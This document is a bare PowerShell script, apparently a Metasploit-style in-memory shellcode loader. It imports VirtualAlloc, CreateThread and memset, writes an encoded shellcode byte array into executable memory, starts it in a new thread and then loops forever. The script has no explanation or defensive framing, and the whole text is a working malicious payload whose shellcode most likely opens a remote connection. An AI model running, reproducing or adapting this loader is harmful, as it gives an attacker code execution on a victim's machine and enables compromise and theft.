$Jpc = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Jpc -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x89,0x08,0x00,0x99,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x83,0xc6,0x04,0x31,0x56,0x0f,0x03,0x56,0x86,0xea,0xf5,0x65,0x70,0x68,0xf5,0x95,0x80,0x0d,0x7f,0x70,0xb1,0x0d,0x1b,0xf0,0xe1,0xbd,0x6f,0x54,0x0d,0x35,0x3d,0x4d,0x86,0x3b,0xea,0x62,0x2f,0xf1,0xcc,0x4d,0xb0,0xaa,0x2d,0xcf,0x32,0xb1,0x61,0x2f,0x0b,0x7a,0x74,0x2e,0x4c,0x67,0x75,0x62,0x05,0xe3,0x28,0x93,0x22,0xb9,0xf0,0x18,0x78,0x2f,0x71,0xfc,0xc8,0x4e,0x50,0x53,0x43,0x09,0x72,0x55,0x80,0x21,0x3b,0x4d,0xc5,0x0c,0xf5,0xe6,0x3d,0xfa,0x04,0x2f,0x0c,0x03,0xaa,0x0e,0xa1,0xf6,0xb2,0x57,0x05,0xe9,0xc0,0xa1,0x76,0x94,0xd2,0x75,0x05,0x42,0x56,0x6e,0xad,0x01,0xc0,0x4a,0x4c,0xc5,0x97,0x19,0x42,0xa2,0xdc,0x46,0x46,0x35,0x30,0xfd,0x72,0xbe,0xb7,0xd2,0xf3,0x84,0x93,0xf6,0x58,0x5e,0xbd,0xaf,0x04,0x31,0xc2,0xb0,0xe7,0xee,0x66,0xba,0x05,0xfa,0x1a,0xe1,0x41,0xcf,0x16,0x1a,0x91,0x47,0x20,0x69,0xa3,0xc8,0x9a,0xe5,0x8f,0x81,0x04,0xf1,0xf0,0xbb,0xf1,0x6d,0x0f,0x44,0x02,0xa7,0xcb,0x10,0x52,0xdf,0xfa,0x18,0x39,0x1f,0x03,0xcd,0xd4,0x1a,0x93,0x72,0xf9,0x3d,0xcf,0xe3,0xf8,0x3d,0x1e,0xa8,0x75,0xdb,0x70,0x00,0xd6,0x74,0x30,0xf0,0x96,0x24,0xd8,0x1a,0x19,0x1a,0xf8,0x24,0xf3,0x33,0x92,0xca,0xaa,0x6c,0x0a,0x72,0xf7,0xe7,0xab,0x7b,0x2d,0x82,0xeb,0xf0,0xc2,0x72,0xa5,0xf0,0xaf,0x60,0x51,0xf1,0xe5,0xdb,0xf7,0x0e,0xd0,0x76,0xf7,0x9a,0xdf,0xd0,0xa0,0x32,0xe2,0x05,0x86,0x9c,0x1d,0x60,0x9d,0x15,0x88,0xcb,0xc9,0x59,0x5c,0xcc,0x09,0x0c,0x36,0xcc,0x61,0xe8,0x62,0x9f,0x94,0xf7,0xbe,0xb3,0x05,0x62,0x41,0xe2,0xfa,0x25,0x29,0x08,0x25,0x01,0xf6,0xf3,0x00,0x93,0xca,0x25,0x6c,0xe1,0x22,0xf6;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$CdU4=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($CdU4.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$CdU4,0,0,0);for (;;){Start-sleep 60};